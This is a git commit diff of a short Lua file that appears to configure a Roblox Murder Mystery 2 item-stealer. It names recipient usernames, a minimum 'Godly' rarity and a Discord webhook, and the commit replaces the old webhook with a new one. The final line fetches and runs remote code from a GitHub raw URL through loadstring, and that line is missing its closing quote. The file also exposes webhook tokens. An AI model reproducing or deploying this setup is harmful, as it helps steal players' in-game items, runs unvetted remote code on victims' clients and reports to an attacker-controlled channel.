c4f8d1f42ec658f4fa5b0e18419a9e2083129f0f
mustachioMman <lukaboulanger91@gmail.com>
2025-07-02 22:40:56 -0400

    Update source.lua

--- source.lua
+++ source.lua
@@ -2,6 +2,6 @@ _G.Usernames = {"jellobloxxer", "robloxian000000", "hq_my"}
 _G.min_rarity = "Godly"
 _G.min_value = 1 
 _G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1320547546854199316/9KRtJ_cl8jyF7ttWL8Za9Cr0INF-aPkAeTowElNoGQyJflu4QovF0S80zf2YTwTulEgE" 
+_G.webhook = "https://discord.com/api/webhooks/1390159532382228580/fYkt-y8qrU205phaib159kCcoVBIpVPmqxgZUTM-yf2C7TXdKZydKSFQVb7j4rWtTECt" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/mustachioMman/Mm2s/refs/heads/main/source.lua))()
